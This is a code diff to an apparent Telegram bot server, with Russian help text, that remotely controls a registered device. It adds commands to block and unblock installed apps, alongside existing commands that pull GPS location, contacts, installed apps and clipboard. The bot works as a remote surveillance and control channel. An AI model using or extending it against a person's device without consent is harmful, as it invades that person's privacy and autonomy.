@@ -792,6 +792,8 @@ async def process_update(update: dict):
             "/location — GPS координаты\n"
             "/contacts — список контактов\n"
             "/apps — установленные приложения\n"
+            "/banapp <номера> — заблокировать приложения из /apps\n"
+            "/unbanapp <номера|all> — разблокировать\n"
             "/clipboard — буфер обмена\n\n"
             "*Управление устройством:*\n"
             "/brightness <0-100> — яркость\n"
@@ -1076,6 +1078,41 @@ async def process_update(update: dict):
         dev_id, err = require_device(chat_id)
         if err: await send_tg(chat_id, err)
         else: await enqueue_multi(chat_id, {"cmd": "get_apps"}, "список приложений")
+
+    elif text.startswith("/banapp ") or text == "/banapp":
+        dev_id, err = require_device(chat_id)
+        if err:
+            await send_tg(chat_id, err)
+            return
+        args = text[8:].strip()
+        if not args:
+            await send_tg(chat_id, "⚠️ Укажи номера из /apps: /banapp 1 3 5")
+            return
+        try:
+            nums = [int(x) for x in args.split()]
+        except ValueError:
+            await send_tg(chat_id, "⚠️ Только числа: /banapp 1 3 5")
+            return
+        await enqueue_multi(chat_id, {"cmd": "ban_app", "indices": nums}, f"ban_app {nums}")
+
+    elif text.startswith("/unbanapp ") or text == "/unbanapp":
+        dev_id, err = require_device(chat_id)
+        if err:
+            await send_tg(chat_id, err)
+            return
+        args = text[10:].strip()
+        if not args:
+            await send_tg(chat_id, "⚠️ Укажи номера: /unbanapp 1 3 5  или /unbanapp all")
+            return
+        if args == "all":
+            await enqueue_multi(chat_id, {"cmd": "unban_app", "all": True}, "unban_app all")
+        else:
+            try:
+                nums = [int(x) for x in args.split()]
+            except ValueError:
+                await send_tg(chat_id, "⚠️ Только числа или all: /unbanapp 1 3 5")
+                return
+            await enqueue_multi(chat_id, {"cmd": "unban_app", "indices": nums}, f"unban_app {nums}")
 
     elif text == "/clipboard":
         dev_id, err = require_device(chat_id)
